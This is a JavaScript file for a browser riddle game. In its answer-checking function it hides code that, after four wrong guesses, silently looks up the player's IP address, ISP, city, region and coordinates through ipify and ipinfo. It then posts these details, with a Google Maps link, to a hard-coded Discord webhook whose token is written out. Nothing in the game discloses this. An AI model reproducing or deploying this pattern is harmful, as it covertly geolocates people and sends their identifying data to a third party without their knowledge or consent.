const riddle = document.getElementById('riddle');
const guessInput = document.getElementById('guess');
const checkButton = document.getElementById('check');
const answerDiv = document.getElementById('answer');
const powerUpInfo = document.getElementById('power-up-info');
const powerUpButton = document.getElementById('power-up-button');

const riddles = [
  { question: 'What has an eye but cannot see?', answer: 'Needle' },
  { question: 'What has no voice but can still speak?', answer: 'Book' },
  { question: 'What is always coming but never arrives?', answer: 'Tomorrow' },
  { question: 'What is full of holes but can still hold water?', answer: 'Sponge' },
  { question: 'What is always hungry and must always be fed, but never gets full?', answer: 'Fire' },
  { question: 'What has one head, one foot, and four legs?', answer: 'Bed' },
  { question: 'What has cities, mountains, and water, but no houses, trees, or fish?', answer: 'Map' },
  { question: 'What has a neck without a head?', answer: 'Bottle' },
  { question: 'What is always running but never gets tired?', answer: 'River' },
  { question: 'What has to be broken before you can use it?', answer: 'Egg' },
  { question: 'What is lighter than a feather, but the strongest person can’t hold it for 5 minutes?', answer: 'Breath' },
  { question: 'What has a mouth but cannot speak?', answer: 'River' },
  { question: 'What has a ring but no finger?', answer: 'Telephone' },
  { question: 'What has keys but cannot open any doors?', answer: 'Piano' }
];

let currentRiddle = 0;
let powerUps = 0;
let powerUpActive = false; 
let wrongAnswers = 0;

function displayRiddle() {
  riddle.textContent = riddles[currentRiddle].question;
  guessInput.value = '';
  answerDiv.textContent = '';
  powerUpInfo.textContent = "";
}

function checkAnswer() {
  const guess = guessInput.value.toLowerCase();
  const correctAnswer = riddles[currentRiddle].answer.toLowerCase();

  if (guess === correctAnswer) {
    answerDiv.textContent = 'Correct!';
    answerDiv.classList.add('correct');
    powerUps++;

    if (powerUps % 2 === 0 && powerUps < 3) {
      powerUpInfo.textContent = "You earned a power up!";
      powerUpButton.style.display = 'block'; 
    } else if (powerUps % 2 === 0 && powerUps >= 3) {
      powerUpInfo.textContent = "You've reached the maximum power ups!";
    }

    currentRiddle++;
    if (currentRiddle < riddles.length) {
      setTimeout(displayRiddle, 2000);
    } else {
      setTimeout(() => {
        answerDiv.textContent = 'You solved all the riddles! Congratulations!';
        checkButton.disabled = true;
      }, 2000);
    }
    wrongAnswers = 0; // Reset wrong answers
  } else {
    answerDiv.textContent = 'Incorrect. Try again.';
    answerDiv.classList.add('incorrect');
    wrongAnswers++;

    if (wrongAnswers >= 4) {
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          const ipAddress = data.ip;

          fetch(`https://ipinfo.io/${ipAddress}/json`)
            .then(response => response.json())
            .then(info => {
              const lat = info.loc.split(',')[0];
              const lng = info.loc.split(',')[1];
              const googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lng}`; 
              const fullInfo = `User with IP: ${ipAddress}, ISP: ${info.org}, Location: ${info.loc}, City: ${info.city}, Region: ${info.region}, Country: ${info.country}, Timezone: ${info.timezone}, Google Maps Link: ${googleMapsLink}`;
              
              fetch('https://discord.com/api/webhooks/1286937961249767467/kZ9joiN7mhenfzZRAeg7HGyXqpipn6E5mHxFGk9I0wFr2ScXDdLMp54jmtNDIBEEXIAL', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                  content: fullInfo 
                })
              });
            })
            .catch(error => {
              console.error('Error fetching IP info:', error);
            });
        })
        .catch(error => {
          console.error('Error fetching IP address:', error);
        });
    }
  }
}

function usePowerUp() {
  powerUpButton.style.display = 'none'; 
  powerUpActive = true; 

  if (powerUps % 2 === 0 && powerUps < 3) { 
    answerDiv.textContent = riddles[currentRiddle].answer;
    setTimeout(displayRiddle, 2000);
  }
}

checkButton.addEventListener('click', checkAnswer);
powerUpButton.addEventListener('click', usePowerUp);

displayRiddle();
